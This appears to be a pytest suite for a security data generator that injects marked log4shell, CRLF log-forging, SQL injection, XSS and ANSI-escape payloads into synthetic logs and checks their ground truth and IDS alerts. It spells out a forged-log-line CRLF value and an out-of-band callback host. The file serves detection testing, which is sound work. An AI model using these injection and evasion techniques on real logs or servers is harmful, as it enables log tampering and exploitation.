# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Integration tests: adversarial_payload injects log-pipeline weakness payloads
across surfaces with accurate ground truth, passes `eforge eval` (including the
CRLF two-physical-line case), and validates safely."""

import datetime
import json
import re
from pathlib import Path

import pytest
from typer.testing import CliRunner

from evidenceforge.cli.commands import app
from evidenceforge.evaluation.engine import EvaluationEngine
from evidenceforge.generation.engine import GenerationEngine
from evidenceforge.models.scenario import Scenario
from evidenceforge.utils.files import load_yaml
from evidenceforge.validation import ScenarioValidator

runner = CliRunner()


def _generate(scenario_data: dict, out: Path) -> Path:
    GenerationEngine(Scenario(**scenario_data), out).generate()
    return out


def _flatten_event(event: dict) -> dict:
    """Flatten a canonical GROUND_TRUTH.json event (attributes hoisted) to a dict."""
    record = {k: v for k, v in event.items() if k != "attributes"}
    record["type"] = record["kind"]
    record.update(event.get("attributes", {}))
    return record


def _records(out: Path) -> list[dict]:
    document = json.loads((out / "GROUND_TRUTH.json").read_text())
    return [_flatten_event(event) for event in document["events"]]


def _ap_records(out: Path) -> list[dict]:
    return [r for r in _records(out) if r.get("kind") == "adversarial_payload" and r.get("emitted")]


@pytest.fixture
def ap_scenario(scenarios_dir: Path) -> dict:
    return load_yaml(scenarios_dir / "adversarial_payload.yaml")


class TestAdversarialPayloadGeneration:
    def test_every_payload_lands_on_disk(self, ap_scenario, tmp_path):
        # Phantom-hunt: every labeled payload's rendered value must actually appear in
        # the generated data. Text formats (syslog/web) carry it verbatim (newline-
        # normalized, so a CRLF split still counts); eCAR JSON-escapes embedded quotes
        # and backslashes, so a process_command_line payload is matched in that form.
        out = _generate(ap_scenario, tmp_path / "out")
        blob = "\n".join(
            p.read_text(errors="replace")
            for p in out.rglob("*")
            if p.is_file()
            and not p.name.startswith(("GROUND_TRUTH", "OBSERVATION", "OUTPUT", "generation.log"))
        )
        norm = blob.replace("\r\n", "\n").replace("\r", "\n")
        recs = _ap_records(out)
        assert len(recs) == 6
        for r in recs:
            v = r["rendered_value"]
            if "ecar" in r["expected_sources"]:
                on_disk = json.dumps(v)[1:-1]  # the JSON-escaped form eCAR writes
            else:
                on_disk = v.replace("\r\n", "\n").replace("\r", "\n")
            assert on_disk in norm, f"{r['storyline_id']} ({r['surface']}) missing on disk"

    def test_every_family_surface_combo_lands_on_disk(self, tmp_path):
        # Phantom-hunt across the FULL matrix: every family on every surface it declares
        # must actually emit and land on disk. The ap_scenario fixture only exercises 3
        # families; this guards all 8 (incl. the formerly-"proposed" xss_reflection /
        # sql_injection / structured_log_injection / oversized_field).
        from evidenceforge.config.payload_families import family_names, get_family

        events = [
            {"type": "adversarial_payload", "surface": surface, "family": fam}
            for fam in sorted(family_names())
            for surface in (get_family(fam).get("surfaces") or [])
        ]
        scenario = _linux_scenario(events, web_server=True)
        # _linux_scenario spaces events at +10*(i+1)m; widen the window so all combos fall
        # inside it (an event scheduled past the window is a separate engine edge case, not
        # what this lands-on-disk matrix is testing).
        scenario["time_window"]["duration"] = f"{len(events) // 6 + 2}h"
        out = _generate(scenario, tmp_path / "matrix")
        blob = "\n".join(
            p.read_text(errors="replace")
            for p in out.rglob("*")
            if p.is_file()
            and not p.name.startswith(("GROUND_TRUTH", "OBSERVATION", "OUTPUT", "generation.log"))
        )
        norm = blob.replace("\r\n", "\n").replace("\r", "\n")
        recs = _ap_records(out)
        assert len(recs) == len(events)  # every (family, surface) combo emitted
        assert {r["family"] for r in recs} == set(family_names())  # all families present
        for r in recs:
            v = r["rendered_value"]
            assert "EFORGE_TEST" in v, f"{r['family']}/{r['surface']} lost its poison marker"
            on_disk = (
                json.dumps(v)[1:-1]
                if "ecar" in r["expected_sources"]
                else v.replace("\r\n", "\n").replace("\r", "\n")
            )
            assert on_disk in norm, f"{r['family']}/{r['surface']} missing on disk"

    def test_skipped_payload_is_labeled_and_not_on_disk(self, tmp_path):
        # Inverse invariant: a payload that cannot be emitted (here an https request to an
        # http-only web server) must be recorded emitted:false with a skipped_reason and its
        # value fields stripped, and must NOT leak any bytes onto disk.
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "http_request_url",
                    "family": "log4shell",
                    "scheme": "https",
                }
            ],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        scenario["environment"]["systems"][1]["services"] = ["http"]  # http-only -> https skip
        out = _generate(scenario, tmp_path / "skip")
        recs = [r for r in _records(out) if r.get("kind") == "adversarial_payload"]
        assert len(recs) == 1
        rec = recs[0]
        assert rec["emitted"] is False
        assert rec.get("skipped_reason")  # a reason is recorded
        assert rec.get("rendered_value") in (None, "")  # value fields stripped on skip
        assert rec.get("value") in (None, "")
        blob = "".join(
            p.read_text(errors="replace")
            for p in out.rglob("*")
            if p.is_file() and not p.name.startswith("GROUND_TRUTH")
        )
        assert "EFORGE_TEST" not in blob  # nothing leaked to disk
        assert "jndi" not in blob

    def test_crlf_payload_is_a_genuine_two_line_split(self, ap_scenario, tmp_path):
        # The whole point of crlf_log_forging: a single record becomes multiple physical
        # lines, split on RAW CR/LF bytes (0d/0a) — never an escaped literal — with the
        # forged line marked. The family rotates CRLF / LF-only / CR-only / double-CRLF
        # variants by seed, so assert the structural split, not one fixed byte sequence.
        out = _generate(ap_scenario, tmp_path / "out")
        syslog = next(p for p in out.rglob("syslog.log") if "EFORGE_TEST" in p.read_text())
        data = syslog.read_bytes()
        # a marked first segment is followed by one-or-more raw newline bytes, then the
        # forged record — whichever crlf variant the seed selected
        assert re.search(rb"field=EFORGE_TEST(?:\r\n|\r|\n)+forged-entry:", data), (
            "crlf payload did not produce a genuine raw multi-line split"
        )
        # and the neutralized (escaped, single-line) form must NOT be what landed
        assert b"field=EFORGE_TEST\\r\\nforged" not in data
        text_lines = syslog.read_text().splitlines()
        injected = next(i for i, ln in enumerate(text_lines) if ln.endswith("field=EFORGE_TEST"))
        forged = next(ln for ln in text_lines[injected + 1 :] if ln.startswith("forged-entry:"))
        assert "EFORGE_TEST" in forged  # forged line stays marked

    def test_process_command_line_has_no_raw_control_byte_in_ecar(self, tmp_path):
        # A control-byte payload routed to process_command_line must reach eCAR with
        # the control byte escaped to a literal, never as a raw byte that corrupts the
        # record. (Literal payload — ansi_escape does not declare this surface.)
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "process_command_line",
                    "value": "EFORGE_TEST \x1b[31mFAKE\x1b[0m EFORGE_TEST",
                }
            ],
            logs=[{"format": "ecar"}],
        )
        out = _generate(scenario, tmp_path / "out")
        ecar_bytes = b"\n".join(p.read_bytes() for p in out.rglob("*") if "ecar" in p.name.lower())
        assert b"\x1b" not in ecar_bytes  # no raw ESC byte anywhere in eCAR
        rec = _ap_records(out)[0]
        # Parse eCAR (un-escaping JSON) and confirm a PROCESS record's command_line is
        # exactly the rendered value — the escaped \x1b survives as a literal, intact.
        ecar_text = "\n".join(p.read_text() for p in out.rglob("*") if "ecar" in p.name.lower())
        proc_cmds = []
        for ln in ecar_text.splitlines():
            try:
                obj = json.loads(ln)
            except ValueError:
                continue
            cmd = str(obj.get("properties", {}).get("command_line", ""))
            if obj.get("object") == "PROCESS" and "FAKE" in cmd:
                proc_cmds.append(cmd)
        assert proc_cmds, "no PROCESS record carried the payload"
        assert rec["rendered_value"] in "\n".join(proc_cmds)
        assert "\\x1b" in proc_cmds[0] and "\x1b" not in proc_cmds[0]  # literal, not raw

    def test_generation_is_deterministic(self, ap_scenario, tmp_path):
        a = _generate(ap_scenario, tmp_path / "a")
        b = _generate(ap_scenario, tmp_path / "b")
        assert (a / "GROUND_TRUTH.json").read_text() == (b / "GROUND_TRUTH.json").read_text()

    def test_records_carry_encoding_and_expected_sources(self, ap_scenario, tmp_path):
        out = _generate(ap_scenario, tmp_path / "out")
        for r in _ap_records(out):
            assert r["encoding"]  # the per-surface transform label is recorded
            assert r["expected_sources"]  # and where it should land

    def test_control_byte_payload_on_user_agent_matches_disk(self, tmp_path):
        # Regression: a control-byte payload (CRLF) on http_user_agent must record a
        # rendered_value byte-equal to disk. The web emitter re-escapes control/
        # backslash/quote in the UA field, so the value is percent-encoded to make that
        # transform a no-op — else ground truth desyncs and presence falsely scores 0.
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "http_user_agent",
                    "family": "crlf_log_forging",
                }
            ],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        out = _generate(scenario, tmp_path / "ua")
        rec = _ap_records(out)[0]
        web = "\n".join(p.read_text() for p in out.rglob("web_access.log"))
        assert rec["rendered_value"] in web  # ground truth matches the on-disk UA bytes
        report = EvaluationEngine(output_dir=out, scenario=Scenario(**scenario)).run()
        ep = next(s for p in report.pillars for s in p.sub_scores if s.key == "event_presence")
        assert ep.score == 100.0

    def test_oob_live_callback_substitutes_and_records(self, tmp_path):
        # With a registered OOB host, a {canary}-using family points at it (live
        # callback) and the ground truth records callback_host for the operator.
        scenario = _linux_scenario(
            [{"type": "adversarial_payload", "surface": "http_request_url", "family": "log4shell"}],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        out = tmp_path / "oob"
        GenerationEngine(Scenario(**scenario), out, oob_hosts=("abc.oast.fun",)).generate()
        rec = _ap_records(out)[0]
        assert rec["callback_host"] == "abc.oast.fun"
        assert "abc.oast.fun" in rec["value"] and "canary.eforge.invalid" not in rec["value"]

    def test_default_run_uses_inert_canary(self, ap_scenario, tmp_path):
        out = _generate(ap_scenario, tmp_path / "inert")
        for r in _ap_records(out):
            assert r.get("callback_host") is None  # no live callback by default
            assert "oast.fun" not in (r.get("value") or "")

    @pytest.mark.parametrize("services,expected", [([], "https"), (["http"], "http")])
    def test_http_payload_scheme_follows_web_server(self, tmp_path, services, expected):
        # The destination web server's supported scheme decides the transport: a
        # generic web_server serves https; an HTTP-only one serves http (port 80).
        # The effective scheme is recorded in ground truth.
        scenario = _linux_scenario(
            [{"type": "adversarial_payload", "surface": "http_request_url", "family": "log4shell"}],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        scenario["environment"]["systems"][1]["services"] = services
        out = _generate(scenario, tmp_path / f"s_{expected}")
        rec = _ap_records(out)[0]
        assert rec["scheme"] == expected

    @pytest.mark.parametrize("scheme", ["http", "https"])
    def test_explicit_scheme_is_honored(self, tmp_path, scheme):
        # An authored `scheme:` forces the transport (the generic web server supports
        # both); the chosen scheme is rendered and recorded.
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "http_request_url",
                    "family": "log4shell",
                    "scheme": scheme,
                }
            ],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        out = _generate(scenario, tmp_path / f"x_{scheme}")
        rec = _ap_records(out)[0]
        assert rec["scheme"] == scheme

    def test_http_payload_visible_on_the_wire_when_plaintext(self, tmp_path):
        # Forcing `scheme: http` makes the payload visible in Zeek http.log (the
        # network-IDS test case); eval still scores it present.
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "http_request_url",
                    "family": "log4shell",
                    "scheme": "http",
                }
            ],
            logs=[{"format": "web_access"}, {"format": "zeek_http"}],
            web_server=True,
        )
        # A captured Zeek http.log requires a network sensor on the path: both hosts share
        # 192.168.20.0/24, so a span sensor on that segment observes the east-west request.
        scenario["environment"]["network"] = {
            "segments": [
                {
                    "name": "servers",
                    "cidr": "192.168.20.0/24",
                    "description": "app + web servers",
                    "exposure": "internal",
                    "systems": ["APP-SRV-01", "WEB-01"],
                }
            ],
            "sensors": [
                {
                    "type": "network",
                    "name": "tap",
                    "monitoring_segments": ["servers"],
                    "direction": "bidirectional",
                    "placement": "span",
                    "log_formats": ["zeek"],
                }
            ],
        }
        out = _generate(scenario, tmp_path / "wire")
        rec = _ap_records(out)[0]
        assert rec["scheme"] == "http"
        http_files = [p for p in out.rglob("*http*.json") if p.is_file()]
        # zeek_http is sensor-routed: the http.log must land under the sensor subdir, not as a
        # flat file (guards against a silent regression back to the removed no-sensor fallback).
        assert any(p.parent.name == "tap" for p in http_files)
        wire = "\n".join(p.read_text(errors="replace") for p in http_files)
        assert rec["rendered_value"] in wire  # the JNDI payload is on the wire (cleartext)
        report = EvaluationEngine(output_dir=out, scenario=Scenario(**scenario)).run()
        ep = next(s for p in report.pillars for s in p.sub_scores if s.key == "event_presence")
        assert ep.score == 100.0

    @pytest.mark.parametrize(
        "family,surface,sid,message_fragment",
        [
            ("log4shell", "http_user_agent", 2024317, "Log4j RCE"),
            ("crlf_log_forging", "http_request_url", 2012887, "CRLF Injection"),
            ("sql_injection", "http_request_url", 2009714, "UNION SELECT"),
        ],
    )
    def test_cleartext_http_payload_ids_alert_matches_variant(
        self, tmp_path, family, surface, sid, message_fragment
    ):
        # The on-wire IDS alert fires ONLY when the rendered variant still contains the
        # signature's flat content token (ids_fires_on) — an evasion variant correctly
        # produces NO alert. Assert the exact invariant for whichever variant the seed
        # picked: ground truth ids_alert AND the on-wire snort_alert.log row are present
        # iff the value carries the token. (Modeling a real flat-content rule's blind spot
        # is the whole point of the evasion variants.)
        from evidenceforge.config.payload_families import get_family

        out = _generate(_ids_scenario(family, surface), tmp_path / "ids")
        rec = _ap_records(out)[0]
        assert rec["scheme"] == "http"
        token = get_family(family)["ids_fires_on"]
        should_fire = token.lower() in rec["value"].lower()
        snort = next((p for p in out.rglob("snort_alert.log")), None)
        on_wire = [
            ln for ln in (snort.read_text().splitlines() if snort else []) if f":{sid}:" in ln
        ]
        if should_fire:
            assert rec["ids_alert"]["sid"] == sid
            assert isinstance(rec["ids_alert"]["rev"], int)
            assert message_fragment in rec["ids_alert"]["message"]
            assert on_wire and message_fragment in on_wire[0]
        else:
            assert rec.get("ids_alert") is None
            assert not on_wire  # the evasion variant must NOT fabricate a detection

    def test_ids_alert_count_tracks_token_bearing_variants(self, tmp_path):
        # Across a multi-event log4shell dataset, the number of on-wire Snort alerts must
        # exactly equal the number of payloads whose value carries the signature token —
        # so a defender sees their IDS catch the canonical lookups and MISS the obfuscated
        # ones, the realistic detection-quality signal (not a fabricated 100% catch rate).
        from evidenceforge.config.payload_families import get_family

        events = [
            {"type": "adversarial_payload", "surface": "http_request_url", "family": "log4shell"}
            for _ in range(10)
        ]
        scenario = _ids_scenario("log4shell", "http_request_url")
        # replace the single event with 10 (reuse the IDS-sensor topology + 6h window fit)
        scenario["storyline"] = [
            {
                "id": f"e{i}",
                "time": f"+{2 * (i + 1)}m",
                "actor": "nina",
                "system": "APP-SRV-01",
                "activity": "inject",
                "events": [ev],
            }
            for i, ev in enumerate(events)
        ]
        out = _generate(scenario, tmp_path / "many")
        token = get_family("log4shell")["ids_fires_on"]
        recs = _ap_records(out)
        token_bearing = sum(1 for r in recs if token.lower() in r["value"].lower())
        with_alert = sum(1 for r in recs if r.get("ids_alert"))
        assert with_alert == token_bearing  # ground truth fires iff token present
        snort = next((p for p in out.rglob("snort_alert.log")), None)
        on_wire = len(
            [ln for ln in (snort.read_text().splitlines() if snort else []) if ":2024317:" in ln]
        )
        assert on_wire == token_bearing  # on-wire alerts match exactly — no over/under-fire
        assert 0 < token_bearing < len(recs)  # the dataset exercises BOTH fire and evade

    def test_ids_alert_not_recorded_when_sensor_cannot_observe(self, tmp_path):
        # GROUND_TRUTH.ids_alert must match the snort_alert.log on disk: when the IDS sensor
        # cannot observe the connection (intra-segment east-west traffic a TAP is blind to),
        # NO snort line renders, so NO ids_alert must be recorded — otherwise ground truth
        # claims an alert absent from the dataset's own logs. Cross-segment (sensor sees it)
        # records ids_alert iff a snort line renders; both topologies must stay consistent.
        from evidenceforge.config.payload_families import get_family

        token = get_family("log4shell")["ids_fires_on"]

        def run(actor_ip, intra):
            scenario = _ids_scenario("log4shell", "http_request_url")
            scenario["environment"]["systems"][0]["ip"] = actor_ip
            if intra:  # put attacker INSIDE the monitored DMZ — TAP cannot see east-west
                scenario["environment"]["network"]["segments"][0]["systems"] = []
                scenario["environment"]["network"]["segments"][1]["systems"] = [
                    "APP-SRV-01",
                    "WEB-01",
                ]
            scenario["storyline"] = [
                {
                    "id": f"e{i}",
                    "time": f"+{2 * (i + 1)}m",
                    "actor": "nina",
                    "system": "APP-SRV-01",
                    "activity": "inject",
                    "events": [
                        {
                            "type": "adversarial_payload",
                            "surface": "http_request_url",
                            "family": "log4shell",
                        }
                    ],
                }
                for i in range(12)
            ]
            out = _generate(scenario, tmp_path / ("intra" if intra else "cross"))
            recs = _ap_records(out)
            token_bearing = sum(1 for r in recs if token.lower() in r["value"].lower())
            with_alert = sum(1 for r in recs if r.get("ids_alert"))
            snort = next((p for p in out.rglob("snort_alert.log")), None)
            on_wire = len(
                [
                    ln
                    for ln in (snort.read_text().splitlines() if snort else [])
                    if ":2024317:" in ln
                ]
            )
            return token_bearing, with_alert, on_wire

        ct, ca, cw = run("192.168.10.30", intra=False)  # office_lan -> dmz: sensor sees it
        it, ia, iw = run("192.168.20.30", intra=True)  # dmz -> dmz: TAP blind east-west
        assert ct > 0 and ca == cw == ct  # cross: GT ids_alert == on-wire == token-bearing
        assert it > 0 and ia == iw == 0  # intra: token-bearing but NO alert (no phantom)

    def test_https_payload_has_no_ids_alert(self, tmp_path):
        # An IDS cannot inspect encrypted traffic: an https (opaque) payload must NOT
        # carry an ids_alert, even for a signature-mapped family.
        out = _generate(
            _ids_scenario("log4shell", "http_user_agent", scheme="https"), tmp_path / "tls"
        )
        rec = _ap_records(out)[0]
        assert rec["scheme"] == "https"
        assert rec.get("ids_alert") is None
        snort = next((p for p in out.rglob("snort_alert.log")), None)
        if snort:
            assert not [ln for ln in snort.read_text().splitlines() if ":2024317:" in ln]

    def test_unmapped_family_has_no_ids_alert(self, tmp_path):
        # A family with no ids_sid (xss_reflection: a log-VIEWER weakness, no on-wire ET
        # signature) must not fabricate an IDS alert on a cleartext http surface.
        out = _generate(_ids_scenario("xss_reflection", "http_request_url"), tmp_path / "noids")
        rec = _ap_records(out)[0]
        assert rec["scheme"] == "http"
        assert rec.get("ids_alert") is None

    def test_ground_truth_carries_surface_pivot_anchors(self, tmp_path):
        # Pivot anchors let an analyst jump from the payload record to the exact evidence
        # row: an http payload records the dst tuple (grep zeek/web by ip:port); a process
        # payload records the pid (the eCAR PROCESS record). Other surfaces omit them.
        http = _ap_records(
            _generate(_ids_scenario("log4shell", "http_user_agent"), tmp_path / "h")
        )[0]
        assert http["dst_ip"] == "192.168.20.40" and http["dst_port"] == 80
        assert "pid" not in http

        proc = _ap_records(
            _generate(
                _linux_scenario(
                    [
                        {
                            "type": "adversarial_payload",
                            "surface": "process_command_line",
                            "value": "EFORGE_TEST payload",
                        }
                    ],
                    logs=[{"format": "ecar"}],
                ),
                tmp_path / "p",
            )
        )[0]
        assert isinstance(proc["pid"], int) and proc["pid"] > 0
        assert "dst_ip" not in proc


class TestAdversarialPayloadEval:
    def test_eval_acceptance_passes(self, ap_scenario, tmp_path):
        out = _generate(ap_scenario, tmp_path / "out")
        report = EvaluationEngine(output_dir=out, scenario=Scenario(**ap_scenario)).run()
        ep = next(s for p in report.pillars for s in p.sub_scores if s.key == "event_presence")
        assert ep.score == 100.0  # all 6 payloads, incl the CRLF split, are found

    def test_eval_reads_canonical_ground_truth_not_synthesis(self, ap_scenario, tmp_path):
        out = _generate(ap_scenario, tmp_path / "out")
        (out / "GROUND_TRUTH.json").unlink()
        report = EvaluationEngine(output_dir=out, scenario=Scenario(**ap_scenario)).run()
        ep = next(s for p in report.pillars for s in p.sub_scores if s.key == "event_presence")
        assert ep.score < 85  # cannot match payloads without the canonical document
        assert "ground_truth.json" in ep.details.lower()  # and it is explained, not mysterious

    def test_spillage_and_adversarial_in_one_step_both_anchored(self):
        # A single storyline step carrying BOTH a spillage and an adversarial_payload
        # event, landing at divergent times (>120s tolerance): per-type anchoring must
        # find BOTH (a shared event.time would let one clobber the other -> false miss).
        from evidenceforge.evaluation.context import EvaluationContext
        from evidenceforge.evaluation.parsers import ParsedRecord
        from evidenceforge.evaluation.pillars.causality import CausalityScorer

        base = _linux_scenario([], logs=[{"format": "syslog"}])
        base["storyline"] = [
            {
                "id": "e0",
                "time": "+20m",
                "actor": "nina",
                "system": "APP-SRV-01",
                "activity": "credential leak and a forging payload",
                "events": [
                    {
                        "type": "spillage",
                        "surface": "syslog_message",
                        "value": "EvidenceForgeFake_X",
                    },
                    {
                        "type": "adversarial_payload",
                        "surface": "syslog_message",
                        "value": "EFORGE_TEST payload Y",
                    },
                ],
            }
        ]
        scenario = Scenario(**base)
        t0 = datetime.datetime(2024, 3, 18, 14, 20, 0, tzinfo=datetime.UTC)
        t1 = t0 + datetime.timedelta(seconds=300)  # > TIME_TOLERANCE (120s)

        def _rec(msg, ts):
            return ParsedRecord(
                source_format="syslog",
                raw="<30>1 2024-03-18T14:20:00Z APP-SRV-01 app - - - " + msg,
                fields={"hostname": "APP-SRV-01", "message": msg},
                timestamp=ts,
            )

        records = {
            "syslog": [
                _rec("app: leaked EvidenceForgeFake_X", t0),
                _rec("nginx: EFORGE_TEST payload Y", t1),
            ]
        }
        ctx = EvaluationContext(
            spillage_ground_truth={
                "e0": {
                    "values": ["EvidenceForgeFake_X"],
                    "records": [{"value": "EvidenceForgeFake_X", "expected_sources": ["syslog"]}],
                    "time": t0,
                }
            },
            adversarial_payload_ground_truth={
                "e0": {
                    "records": [{"value": "EFORGE_TEST payload Y", "expected_sources": ["syslog"]}],
                    "time": t1,
                }
            },
        )
        pillar = CausalityScorer().score(records, scenario, ctx)
        ep = next(s for s in pillar.sub_scores if s.key == "event_presence")
        assert ep.score == 100.0  # both families found despite the 300s divergence
        # Temporal integrity must also credit both: the per-anchor check judges each
        # trace against its own type's anchor, not the single (clobbered) event.time.
        ti = next(s for s in pillar.sub_scores if s.key == "temporal_integrity")
        assert ti.score == 100.0

    def test_crlf_two_line_span_is_matched_against_raw_source(self):
        # Focused: a crlf payload whose value spans two physical lines (the injected
        # line plus an orphan that fails to parse) is found via the newline-normalized
        # raw-source blob, even though no single parsed record contains it.
        from evidenceforge.evaluation.context import EvaluationContext
        from evidenceforge.evaluation.parsers import ParsedRecord
        from evidenceforge.evaluation.pillars.causality import CausalityScorer

        value = "field=EFORGE_TEST\r\nforged-entry: status=cleared EFORGE_TEST"
        scenario = Scenario(
            **_linux_scenario(
                [{"type": "adversarial_payload", "surface": "syslog_message", "value": value}],
                logs=[{"format": "syslog"}],
            )
        )
        emitted = datetime.datetime(2024, 3, 18, 14, 20, 0, tzinfo=datetime.UTC)
        injected = ParsedRecord(
            source_format="syslog",
            raw="<30>1 2024-03-18T14:20:00Z APP-SRV-01 webapp - - - field=EFORGE_TEST\r",
            fields={"hostname": "APP-SRV-01", "message": "field=EFORGE_TEST"},
            timestamp=emitted,
        )
        orphan = ParsedRecord(  # the forged second line fails to parse → no message field
            source_format="syslog",
            raw="forged-entry: status=cleared EFORGE_TEST",
            fields={},
            timestamp=None,
            parse_errors=["does not match syslog format"],
        )
        ctx = EvaluationContext(
            adversarial_payload_ground_truth={
                "e0": {
                    "records": [{"value": value, "expected_sources": ["syslog"]}],
                    "time": emitted,
                }
            }
        )
        pillar = CausalityScorer().score({"syslog": [injected, orphan]}, scenario, ctx)
        ep = next(s for s in pillar.sub_scores if s.key == "event_presence")
        assert ep.score == 100.0  # the forged second line was verified present

    def test_two_same_family_payloads_each_must_land(self, tmp_path):
        # Two events of the SAME family: per-event {alnum} variation makes their
        # rendered values distinct, so a single landing cannot credit both. Dropping
        # one payload's line must drop the score (the phantom-positive regression).
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "syslog_message",
                    "family": "ansi_escape",
                },
                {
                    "type": "adversarial_payload",
                    "surface": "syslog_message",
                    "family": "ansi_escape",
                },
            ],
            logs=[{"format": "syslog"}],
        )
        out = _generate(scenario, tmp_path / "out")
        recs = _ap_records(out)
        assert len({r["rendered_value"] for r in recs}) == 2  # distinct, not identical

        report = EvaluationEngine(output_dir=out, scenario=Scenario(**scenario)).run()
        ep = next(s for p in report.pillars for s in p.sub_scores if s.key == "event_presence")
        assert ep.score == 100.0  # both land

        victim = recs[0]["rendered_value"]
        for sp in out.rglob("syslog.log"):
            kept = [ln for ln in sp.read_text().splitlines() if victim not in ln]
            sp.write_text("\n".join(kept) + "\n")
        report2 = EvaluationEngine(output_dir=out, scenario=Scenario(**scenario)).run()
        ep2 = next(s for p in report2.pillars for s in p.sub_scores if s.key == "event_presence")
        assert ep2.score < 100.0  # the dropped payload is not masked by its surviving twin

    def test_partial_crlf_landing_is_not_credited(self):
        # If the forged second line did NOT land (only the injected first line is on
        # disk), the payload must be scored absent — the full span is the contract.
        from evidenceforge.evaluation.context import EvaluationContext
        from evidenceforge.evaluation.parsers import ParsedRecord
        from evidenceforge.evaluation.pillars.causality import CausalityScorer

        value = "field=EFORGE_TEST\r\nforged-entry: status=cleared EFORGE_TEST"
        scenario = Scenario(
            **_linux_scenario(
                [{"type": "adversarial_payload", "surface": "syslog_message", "value": value}],
                logs=[{"format": "syslog"}],
            )
        )
        emitted = datetime.datetime(2024, 3, 18, 14, 20, 0, tzinfo=datetime.UTC)
        only_first = ParsedRecord(
            source_format="syslog",
            raw="<30>1 2024-03-18T14:20:00Z APP-SRV-01 webapp - - - field=EFORGE_TEST",
            fields={"hostname": "APP-SRV-01", "message": "field=EFORGE_TEST"},
            timestamp=emitted,
        )
        ctx = EvaluationContext(
            adversarial_payload_ground_truth={
                "e0": {
                    "records": [{"value": value, "expected_sources": ["syslog"]}],
                    "time": emitted,
                }
            }
        )
        pillar = CausalityScorer().score({"syslog": [only_first]}, scenario, ctx)
        ep = next(s for s in pillar.sub_scores if s.key == "event_presence")
        assert ep.score < 100.0  # the missing forged line is not masked


# --- Validation ----------------------------------------------------------------


def _linux_scenario(
    events, *, logs=None, actor="nina", actor_os="Ubuntu 22.04 LTS", web_server=False
):
    logs = logs or [{"format": "syslog"}, {"format": "ecar"}, {"format": "web_access"}]
    systems = [
        {
            "hostname": "APP-SRV-01",
            "ip": "192.168.20.30",
            "os": actor_os,
            "type": "server",
            "assigned_user": actor,
        }
    ]
    if web_server:
        systems.append(
            {
                "hostname": "WEB-01",
                "ip": "192.168.20.40",
                "os": "Ubuntu 22.04 LTS",
                "type": "server",
                "roles": ["web_server"],
            }
        )
    return {
        "version": "1.0",
        "name": "adversarial-validate",
        "description": "validation harness",
        "environment": {
            "description": "one linux host",
            "users": [
                {
                    "username": actor,
                    "full_name": "Actor",
                    "email": "actor@example.com",
                    "primary_system": "APP-SRV-01",
                    "enabled": True,
                }
            ],
            "systems": systems,
        },
        "time_window": {"start": "2024-03-18T14:00:00Z", "duration": "1h"},
        "baseline_activity": {"description": "x", "intensity": "low", "variation": "low"},
        "output": {"logs": logs, "destination": "./output", "compression": False},
        "storyline": [
            {
                "id": f"e{i}",
                "time": f"+{10 * (i + 1)}m",
                "actor": actor,
                "system": "APP-SRV-01",
                "activity": "inject",
                "events": [ev],
            }
            for i, ev in enumerate(events)
        ],
    }


def _ids_scenario(family, surface, *, scheme=None):
    """A cleartext-http scenario whose web server sits behind an IDS sensor.

    The attacker (office_lan) reaches the web server (server_dmz) so the request
    crosses INTO the monitored DMZ — the only topology in which a perimeter IDS
    observes the flow and can render an on-wire alert.
    """
    event = {"type": "adversarial_payload", "surface": surface, "family": family}
    if scheme is not None:
        event["scheme"] = scheme
    scenario = _linux_scenario(
        [event],
        logs=[{"format": "web_access"}, {"format": "snort_alert"}, {"format": "zeek"}],
        web_server=True,
    )
    scenario["environment"]["systems"][0]["ip"] = "192.168.10.30"  # attacker (office_lan)
    scenario["environment"]["systems"][1]["ip"] = "192.168.20.40"  # web server (dmz)
    if scheme != "https":
        # Force cleartext so the IDS can inspect; an https request needs a server that
        # serves https, so leave the generic web_server (both schemes) in that case.
        scenario["environment"]["systems"][1]["services"] = ["http"]
    scenario["environment"]["network"] = {
        "segments": [
            {
                "name": "office_lan",
                "cidr": "192.168.10.0/24",
                "description": "clients",
                "exposure": "internal",
                "systems": ["APP-SRV-01"],
            },
            {
                "name": "server_dmz",
                "cidr": "192.168.20.0/24",
                "description": "dmz",
                "exposure": "both",
                "systems": ["WEB-01"],
            },
        ],
        "sensors": [
            {
                "type": "network",
                "name": "tap",
                "monitoring_segments": ["office_lan", "server_dmz"],
                "direction": "bidirectional",
                "placement": "span",
                "log_formats": ["zeek"],
            },
            {
                "type": "ids",
                "name": "perimeter-ids",
                "monitoring_segments": ["server_dmz"],
                "direction": "bidirectional",
                "placement": "tap",
                "log_formats": ["snort_alert"],
            },
        ],
    }
    return scenario


def _errors(scenario_dict):
    v = ScenarioValidator(Scenario(**scenario_dict))
    v.validate()
    return [i.message for i in v.issues if i.severity == "error"]


class TestAdversarialPayloadValidation:
    def test_good_fixture_validates_clean(self, scenarios_dir):
        v = ScenarioValidator(Scenario(**load_yaml(scenarios_dir / "adversarial_payload.yaml")))
        v.validate()
        assert not v.has_errors()

    def test_unknown_family_is_error(self):
        errs = _errors(
            _linux_scenario(
                [{"type": "adversarial_payload", "surface": "syslog_message", "family": "nope"}]
            )
        )
        assert any("Unknown adversarial payload family" in m for m in errs)

    def test_family_on_undeclared_surface_is_error(self):
        # csv_formula does not model http_user_agent — caught at validation, not at
        # generation time.
        errs = _errors(
            _linux_scenario(
                [
                    {
                        "type": "adversarial_payload",
                        "surface": "http_user_agent",
                        "family": "csv_formula",
                    }
                ],
                logs=[{"format": "web_access"}],
                web_server=True,
            )
        )
        assert any("does not model surface" in m for m in errs)

    def test_unsafe_literal_is_error(self):
        errs = _errors(
            _linux_scenario(
                [
                    {
                        "type": "adversarial_payload",
                        "surface": "syslog_message",
                        "value": "no marker here",
                    }
                ]
            )
        )
        assert any("Unsafe adversarial payload value" in m for m in errs)

